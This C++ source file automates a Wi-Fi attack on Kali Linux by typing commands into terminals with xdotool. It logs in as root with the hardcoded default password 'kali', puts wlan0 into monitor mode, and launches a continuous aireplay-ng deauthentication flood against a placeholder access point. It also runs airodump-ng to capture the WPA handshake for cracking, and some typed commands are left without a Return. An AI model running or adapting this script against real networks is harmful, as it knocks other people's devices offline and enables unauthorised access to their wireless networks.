#include <cstdlib>
#include <thread> // Add this header for the sleep function

int main() {
    std::system("x-terminal-emulator &"); // Open terminal emulator in the background
    std::system("sleep 1"); // Wait for terminal emulator to open

// access the root permission
    std::system("xdotool type \"sudo su\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"kali\"");
    std::system("xdotool key Return");

    std::system("sleep 1");

//enabling the moniter mode
    std::system("sleep 1");
    
    std::system("xdotool type \"airmon-ng start wlan0\"");
    std::system("xdotool key Return");

// Playing deauthcaution attack on the wifi
    std::system("xdotool type \"sudo aireplay-ng --deauth 0 -a (bssid) wlan0\"");


// capturing handshake of the wifi
    std::system("x-terminal-emulator &");
    std::system("sleep 1");
    
    // access the root permission
    std::system("xdotool type \"sudo su\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"kali\"");
    std::system("xdotool key Return");

    std::system("xdotool type \"cd /home/kali/wifi\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"sudo airodump-ng -w (hack1) -c (2) --bssid (bssid) wlan0\"");


    std::system("x-terminal-emulator &");
    std::system("sleep 1");

//checking the wifi that are in the range
    std::system("sleep 1");
    
    // access the root permission
    std::system("xdotool type \"sudo su\"");
    std::system("xdotool key Return");
    std::system("xdotool type \"kali\"");
    std::system("xdotool key Return");

    std::system("xdotool type \"sudo airodump-ng wlan0\"");
    std::system("xdotool key Return");
    
    return 0;
}
